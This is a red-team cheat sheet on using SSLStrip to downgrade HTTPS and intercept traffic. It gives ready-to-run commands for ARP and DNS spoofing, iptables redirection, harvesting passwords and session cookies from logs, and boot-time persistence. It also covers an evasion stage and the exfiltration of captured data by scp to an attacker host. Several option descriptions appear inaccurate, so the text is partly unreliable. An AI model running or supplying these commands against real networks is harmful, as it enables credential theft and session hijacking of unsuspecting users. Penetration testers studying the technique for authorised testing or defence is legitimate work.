# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

# SSLStrip

SSLStrip is a tool created by Moxie Marlinspike, used to perform man-in-the-middle (MITM) attacks by transparently hijacking HTTP traffic on a network, and converting HTTPS links to HTTP, thus downgrading encrypted connections to unencrypted ones. This allows attackers to intercept sensitive information such as credentials, session cookies, and more.

## Prerequisites
SSLStrip requires a man-in-the-middle attack to be successful. This means you need to be able to intercept traffic using techniques like ARP spoofing or DNS poisoning.

## Basic Command Syntax
```bash
sslstrip [options]
```

## Core Options
- `-l <port>`: Specify the local port to listen for traffic.
- `-w <logfile>`: Log HTTP traffic to a specified file.
- `-a`: Log all requests, including images and other assets.
- `-f`: Spoof favicon requests.
- `-p`: Do not perform SSLStripping on SSL traffic (useful for monitoring without interference).
- `-k`: Kill requests that are not HTTP (strip all non-HTTP requests).
- `--help`: Show the help menu for SSLStrip.

# Commands and Use Cases

1. **Simple SSLStrip Setup (Default Port 8080)**:  This command sets up SSLStrip to listen on port 8080 for traffic that is redirected from the victim’s machine.
```bash
sslstrip -l 8080
```
2. **Logging Captured Traffic**: Listens on port 8080 and logs the captured HTTP traffic (including any sensitive information like usernames and passwords) to the `captured_traffic.log` file.
```bash
sslstrip -l 8080 -w captured_traffic.log
```
3. **Full Capture Including Images and Assets**: Logs all HTTP requests and responses, including images, CSS, JavaScript, and other assets in `full_capture.log`.
```bash
sslstrip -l 8080 -a -w full_capture.log
```
4. **Spoofing Favicon Requests**: Includes spoofed favicon requests in the captured logs, which can help with evading detection during a phishing or MITM attack.
```bash
sslstrip -l 8080 -f -w capture_favicon.log
```
5. **Selectively Ignore SSL Traffic**: Logs HTTP traffic but ignores actual SSL traffic (useful for specific cases where you don’t want to interfere with encrypted traffic).
```bash
sslstrip -l 8080 -p -w selective_log.log
```
6. **Kill All Non-HTTP Requests**: Terminates all traffic that is not HTTP, stripping all SSL connections.
```bash
sslstrip -l 8080 -k -w strict_http.log
```

# Penetration Testing Techniques

## External Reconnaissance

#### Identifying Hosts with HTTPS Services

SSLStrip works best when targeting users who are trying to access HTTPS websites. This means you need to identify potential targets that commonly access secure services.

1. **DNS Spoofing to Redirect HTTPS Requests**:  This redirects requests for specific domains (e.g., `www.example.com`) to the attacker's IP address for HTTPS downgrading via SSLStrip.
    ```bash
    dnsspoof -i <network_interface> -f hosts_file.txt
    ```
2. **Identifying Common HTTPS Sites**: Scans the network for open HTTPS services on port 443. Once you identify services, you can prepare to intercept traffic using SSLStrip.
    ```bash
    nmap -p 443 --open -sV <target_subnet>
    ```
3. **MITM Setup (ARP Spoofing)**:  Enables IP forwarding and sets up ARP spoofing to place your machine between the victim and the gateway. This is necessary for SSLStrip to work.
    ```bash
    echo 1 > /proc/sys/net/ipv4/ip_forward
    arpspoof -i <network_interface> -t <target_ip> <gateway_ip>
    ```

## Initial Access

#### Downgrading Secure Traffic to Capture Credentials

1. **Setup IPTables for Traffic Redirection**:  Redirects HTTP and HTTPS traffic to port 8080, where SSLStrip is running. This effectively downgrades the target’s HTTPS connections to HTTP.
    ```bash
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
    ```
2. **Running SSLStrip to Capture Downgraded Traffic**:  Captures credentials and other sensitive information as users connect to previously secure services.
    ```bash
    sslstrip -l 8080 -w captured.log
    ```
3. **Combining SSLStrip with DNS Spoofing**: This method combines DNS spoofing with SSLStrip to ensure that all HTTPS traffic is downgraded and intercepted.
    ```bash
    dnsspoof -i <interface> -f hosts.txt &
    sslstrip -l 8080 -w dns_capture.log
    ```

## Persistence

#### DNS Poisoning for Persistent MITM

SSLStrip can be combined with persistent DNS poisoning to maintain long-term access to encrypted traffic:

1. **Persistent DNS Spoofing**: This keeps DNS poisoning active, making sure the victim continuously gets redirected through the attacker’s machine.
    ```bash
    ettercap -T -q -i <network_interface> -P dns_spoof
    ```
2. **Automating SSLStrip**: Sets SSLStrip to run automatically on system boot, ensuring persistent downgrading and traffic interception.
    ```bash
    echo "sslstrip -l 8080 -w sslstrip.log" > /etc/rc.local
    ```

## Credential Harvesting

#### Harvesting Login Information from HTTPS Sites

SSLStrip can be used to collect credentials by downgrading secure login pages to HTTP.

1. **Intercepting Login Forms**: This command logs all requests, including credentials submitted via login forms that were downgraded from HTTPS to HTTP.
    ```bash
    sslstrip -l 8080 -a -w logins.log
    ```
2. **Extracting Credentials from Logs**: Parses the logs to extract credentials submitted through POST requests that include passwords.
    ```bash
    grep "POST" logins.log | grep "password"
    ```

## Privilege Escalation

#### Capturing Administrator Login Credentials

Once inside the network, SSLStrip can be used to target administrator or privileged accounts.

1. **Targeting Privileged Users**: Use SSLStrip to capture login credentials for administrative panels that rely on HTTPS.
    ```bash
    sslstrip -l 8080 -w admin_creds.log
    ```
2. **Exploiting Weak HTTPS Configurations**: Use `nmap` to enumerate weak SSL/TLS configurations. After identifying weak encryption, SSLStrip can help downgrade the secure connection for credential harvesting.
    ```bash
    nmap --script ssl-enum-ciphers -p 443 <target_ip>
    ```

## Internal Reconnaissance

#### Mapping Internal HTTPS Services

Once inside a compromised network, use SSLStrip to map internal services that rely on HTTPS for security.

1. **Scanning for HTTPS Services**: Identifies internal services using HTTPS.
    ```bash
    nmap -p 443 --open -sV <internal_subnet>
    ```
2. **Intercepting Internal Login Credentials**: Logs traffic and captures login credentials for internal services that have been downgraded to HTTP.
    ```bash
    sslstrip -l 8080 -w internal_creds.log
    ```

## Lateral Movement, Pivoting, and Tunneling

#### Moving Laterally by Intercepting Secure Sessions

SSLStrip can help with lateral movement by intercepting sensitive information such as session cookies that allow the attacker to hijack sessions.

1. **Session Hijacking with SSLStrip**: Captures session cookies from downgraded HTTPS requests. These cookies can be used for session hijacking.
    ```bash
    sslstrip -l 8080 -w session_capture.log
    grep "Set-Cookie" session_capture.log
    ```
2. **Using ARP Spoofing to Pivot Through a Network**:  ARP spoofing allows SSLStrip to downgrade HTTPS requests across multiple machines within the network, facilitating lateral movement.
    ```bash
    arpspoof -i <interface> -t <victim_ip> <gateway_ip> &
    sslstrip -l 8080 -w pivot_capture.log
    ```

## Defense Evasion

#### Stealthy MITM Using SSLStrip

1. **Avoid Detection by Limiting SSLStrip Logging**: Runs SSLStrip without modifying the SSL traffic and only logs HTTP traffic to avoid drawing attention.
    ```bash
    sslstrip -l 8080 -p -w minimal.log
    ```
2. **Use Favicon Spoofing for Phishing**: Spoofs favicon requests to make the phishing attempt more convincing.
    ```bash
    sslstrip -l 8080 -f -w favicon_capture.log
    ```
3. **MITM Attack with Low Network Footprint**: Combines ARP spoofing with SSLStrip in a low-profile manner, avoiding noisy logging or excessive DNS queries.
    ```bash
    ettercap -T -M arp:remote /<gateway_ip>/ /<target_ip>/ -q &
    sslstrip -l 8080 -w stealth_capture.log
    ```

## Data Exfiltration

#### Exfiltrating Sensitive Information via Downgraded HTTPS

1. **Capturing Login Data from Downgraded HTTPS Sessions**: Intercepts sensitive data such as login credentials or payment information from downgraded HTTPS sessions.
    ```bash
    sslstrip -l 8080 -w sensitive_data.log
    grep "POST" sensitive_data.log
    ```
2. **Exfiltrating Captured Data**: Uses `scp` to exfiltrate the captured log file containing sensitive data.
    ```bash
    scp sslstrip.log attacker@<attack_ip>:~/exfiltrated_data/
    ```


# Resources

|**Name**|**URL**|
|---|---|
|SSLStrip Documentation|https://www.thoughtcrime.org/software/sslstrip/|
|SSLStrip GitHub Repository|https://github.com/moxie0/sslstrip|
|Defeating SSL with SSLStrip|https://blog.heckel.xyz/2018/02/20/sslstrip-mitm-attacks/|
|How to Use SSLStrip in Penetration Testing|https://www.offensive-security.com/metasploit-unleashed/sslstrip/|
|SSLStrip with ARP Spoofing|https://null-byte.wonderhowto.com/how-to/man-middle-attack-part-1-arp-spoofing-0169430/|
|SSLStrip and DNS Spoofing|https://null-byte.wonderhowto.com/how-to/hack-like-pro-hijack-https-traffic-with-dns-spoofing-sslstrip-0184848/|
|SSLStrip Attack Defense Mechanisms|https://resources.infosecinstitute.com/topic/sslstrip-and-ssl-attacks/|
|SSLStrip for Red Teamers|https://www.pentestpartners.com/security-blog/sslstrip-and-bypassing-hsts/|

